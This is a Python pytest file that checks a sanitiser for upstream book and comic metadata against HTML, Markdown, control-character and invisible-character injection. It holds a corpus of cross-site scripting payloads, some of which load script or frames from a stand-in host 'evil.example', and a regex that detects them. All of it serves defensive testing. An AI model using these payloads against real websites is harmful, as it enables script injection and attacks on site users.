"""ENF-SEC-015: upstream text is plain by default; HTML survives only through nh3."""

from __future__ import annotations

import re
from html.parser import HTMLParser

import pytest

from shelfhold.infrastructure.content_trust import (
    ALLOWED_HTML_ATTRIBUTES,
    ALLOWED_HTML_TAGS,
    Destination,
    sanitize_upstream_text,
)

# The injection corpus: HTML/script vectors, mutation XSS, encodings and Markdown relays.
HTML_VECTORS = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<img src=x onerror=alert(1)>",
    '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
    "<svg onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    '<svg xmlns="http://www.w3.org/2000/svg"><a xlink:href="javascript:alert(1)">x</a></svg>',
    '<a href="javascript:alert(1)">click</a>',
    '<a href="jav&#x09;ascript:alert(1)">click</a>',
    '<a href=" javascript:alert(1)">click</a>',
    '<a href="JaVaScRiPt:alert(1)">click</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
    '<a href="vbscript:msgbox(1)">click</a>',
    "<iframe src=//evil.example></iframe>",
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    "<object data=//evil.example/x.swf></object>",
    "<embed src=//evil.example/x.swf>",
    "<form action=//evil.example><input name=p type=password autofocus onfocus=alert(1)></form>",
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<base href="//evil.example/">',
    '<link rel=stylesheet href="//evil.example/x.css">',
    "<style>@import '//evil.example/x.css'; body{background:url(javascript:alert(1))}</style>",
    '<div style="background:url(javascript:alert(1))">x</div>',
    '<p onclick="alert(1)" onmouseover="alert(2)">hover</p>',
    '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img onerror=1&gt;">',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1);//<</script>",
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<!--[if gte IE 4]><script>alert(1)</script><![endif]-->",
    "<![CDATA[<script>alert(1)</script>]]>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3c;img src=x onerror=alert(1)&#x3e;",
    "<template><script>alert(1)</script></template>",
    "<details open ontoggle=alert(1)>x</details>",
    "<video><source onerror=alert(1)></video>",
]

MARKDOWN_VECTORS = [
    "[click](javascript:alert(1))",
    "![tracker](https://evil.example/pixel.png)",
    "[ref]: javascript:alert(1)\n\n[x][ref]",
    "<https://evil.example/x>",
    "# heading\n\n* list\n\n```\ncode\n```",
    "[a](<javascript:alert(1)>)",
]

BIDI_AND_CONTROL = "Title‮evil‬⁦x⁩ \x07bell \x1b[31mred\x00nul ​"

TAG = re.compile(r"<\s*[A-Za-z!?/]")
DANGEROUS = re.compile(
    r"<\s*(script|iframe|object|embed|style|svg|math|form|meta|base|link|template)|"
    r"\bon\w+\s*=|javascript:|vbscript:|data:text/html",
    re.IGNORECASE,
)


class _Audit(HTMLParser):
    """Collects every tag/attribute/URL the output would hand to a browser."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=False)
        self.tags: list[str] = []
        self.attrs: list[tuple[str, str, str | None]] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.tags.append(tag)
        self.attrs += [(tag, k, v) for k, v in attrs]

    handle_startendtag = handle_starttag


def _audit(html: str) -> _Audit:
    audit = _Audit()
    audit.feed(html)
    audit.close()
    return audit


@pytest.mark.req("ENF-SEC-015")
@pytest.mark.parametrize("vector", HTML_VECTORS)
def test_upstream_text_sanitized_injection_corpus(vector: str) -> None:
    # 1. plain text (the default): nothing that parses as a tag survives, not even decoded
    plain = sanitize_upstream_text(vector)
    assert plain == sanitize_upstream_text(vector, destination=Destination.PLAIN)
    assert not TAG.search(plain), plain
    assert not DANGEROUS.search(plain), plain
    assert "\x00" not in plain

    # 2. plain text is a fixed point: sanitising twice changes nothing
    assert sanitize_upstream_text(plain) == plain

    # 3. HTML: only the minimal allowlist, no script URL, links neutralised
    html = sanitize_upstream_text(vector, destination=Destination.HTML)
    audit = _audit(html)
    assert set(audit.tags) <= ALLOWED_HTML_TAGS, html
    for tag, name, value in audit.attrs:
        assert name in ALLOWED_HTML_ATTRIBUTES.get(tag, set()), (tag, name, html)
        if name == "href":
            assert value is not None
            assert re.match(r"(https?://|mailto:)", value, re.IGNORECASE), value
    # entity-escaped text such as &lt;img onerror=..&gt; is inert; a live tag or URL never is
    assert not re.search(r"<\s*(script|style)", html, re.IGNORECASE)
    assert sanitize_upstream_text(html, destination=Destination.HTML) == html  # idempotent

    # 4. Markdown destination: plain text with every Markdown construct escaped
    markdown = sanitize_upstream_text(vector, destination=Destination.MARKDOWN)
    assert not TAG.search(markdown), markdown
    assert not re.search(r"(?<!\\)\]\(", markdown), markdown


@pytest.mark.req("ENF-SEC-015")
@pytest.mark.parametrize("vector", MARKDOWN_VECTORS)
def test_upstream_markdown_cannot_relay_links_or_images(vector: str) -> None:
    out = sanitize_upstream_text(vector, destination=Destination.MARKDOWN)
    for char in "[]()<>`":
        assert re.sub(rf"\\{re.escape(char)}", "", out).count(char) == 0, (char, out)
    # in plain text the characters stay: a title like "Re:Zero [Light Novel]" is not mangled
    assert sanitize_upstream_text("Re:Zero [Light Novel] (2016)") == "Re:Zero [Light Novel] (2016)"


@pytest.mark.req("ENF-SEC-015")
def test_upstream_text_legitimate_content_is_preserved() -> None:
    assert sanitize_upstream_text("Tom & Jerry <3 \"quotes\" 'apostrophes' 5 < 6 > 4") == (
        "Tom & Jerry <3 \"quotes\" 'apostrophes' 5 < 6 > 4"
    )
    assert sanitize_upstream_text("日本語のタイトル Œuvre café") == "日本語のタイトル Œuvre café"
    assert sanitize_upstream_text("line 1\nline 2\ttabbed") == "line 1\nline 2\ttabbed"
    html = sanitize_upstream_text(
        "<p>One <b>bold</b>, <em>em</em><br>two</p><ul><li>a</li></ul>"
        '<a href="https://example.org/x" target="_blank" onclick="x()">link</a>',
        destination=Destination.HTML,
    )
    assert "<p>One <b>bold</b>, <em>em</em><br>two</p>" in html
    assert "<ul><li>a</li></ul>" in html
    assert 'href="https://example.org/x"' in html
    assert "onclick" not in html
    assert 'rel="noopener noreferrer"' in html
    assert "target" not in html  # no window.opener, no new browsing context decided by upstream
    # plain text from HTML keeps the words, drops the markup
    assert sanitize_upstream_text("<p>Hello <b>world</b></p>") == "Hello world"


@pytest.mark.req("ENF-SEC-015")
def test_upstream_text_script_and_style_content_is_dropped_not_kept_as_text() -> None:
    assert "alert" not in sanitize_upstream_text("a<script>alert(1)</script>b")
    assert "alert" not in sanitize_upstream_text("a<style>*{x:alert(1)}</style>b")
    assert sanitize_upstream_text("a<script>alert(1)</script>b") == "ab"


@pytest.mark.req("ENF-SEC-015")
def test_upstream_text_control_and_bidi_characters_are_removed() -> None:
    out = sanitize_upstream_text(BIDI_AND_CONTROL)
    assert not re.search(r"[\x00-\x08\x0b-\x1f\x7f-\x9f‪-‮⁦-⁩​-‏]", out)
    assert out.startswith("Title")


@pytest.mark.req("ENF-SEC-015")
def test_upstream_text_is_length_bounded_and_never_none() -> None:
    long = "a" * 100_000
    assert len(sanitize_upstream_text(long, max_length=2_000)) <= 2_000
    assert sanitize_upstream_text("") == ""
    # a cut never leaves half of an entity or of a tag behind
    cut = sanitize_upstream_text(
        "x" * 9 + "&amp; <b>bold</b>", destination=Destination.HTML, max_length=11
    )
    assert "&am" not in cut.replace("&amp;", "")
    assert not _audit(cut).tags or set(_audit(cut).tags) <= ALLOWED_HTML_TAGS
    with pytest.raises(TypeError):
        sanitize_upstream_text(None)  # type: ignore[arg-type]


@pytest.mark.req("ENF-SEC-015")
def test_upstream_text_nh3_allowlist_is_minimal() -> None:
    assert {"script", "style", "iframe", "img", "svg", "form", "object", "embed"}.isdisjoint(
        ALLOWED_HTML_TAGS
    )
    assert set(ALLOWED_HTML_ATTRIBUTES) <= {"a"}
    for attrs in ALLOWED_HTML_ATTRIBUTES.values():
        assert not any(a.startswith("on") or a in {"style", "src", "srcset"} for a in attrs)


# U+FFFE, U+FFFF, U+061C, U+00AD, U+3164 from the review of #40, then the other fillers
INVISIBLE = ["\ufffe", "\uffff", "\u061c", "\u00ad", "\u3164", "\u115f", "\u1160", "\uffa0",
             "\u180e", "\u17b4", "\U000e0041"]  # fmt: skip
XML_CHAR = re.compile("[\t\n\x20-\ud7ff\ue000-\ufffd\U00010000-\U0010ffff]*")


@pytest.mark.req("ENF-SEC-015")
@pytest.mark.parametrize("char", INVISIBLE)
@pytest.mark.parametrize("destination", list(Destination))
def test_upstream_text_invisible_characters_are_removed(
    char: str, destination: Destination
) -> None:
    out = sanitize_upstream_text(f"Ti{char}tle", destination=destination)
    assert out == "Title"


@pytest.mark.req("ENF-SEC-015")
@pytest.mark.parametrize("destination", list(Destination))
def test_upstream_text_lone_surrogates_are_removed_and_output_is_utf8_and_xml_safe(
    destination: Destination,
) -> None:
    hostile = (
        "a\ud800b\udfffc\udc00\ud800d"
        + "".join(INVISIBLE)
        + "\x00\x0b\x1f e\u0301 \U0001f468\u200d\U0001f469"
    )
    out = sanitize_upstream_text(hostile, destination=destination)
    out.encode("utf-8")  # a lone surrogate would raise here
    assert XML_CHAR.fullmatch(out), repr(out)  # writable to ComicInfo.xml and the OPF as is
    assert out.startswith("abcd")
    assert "\u200d" in out  # the emoji joiner survives
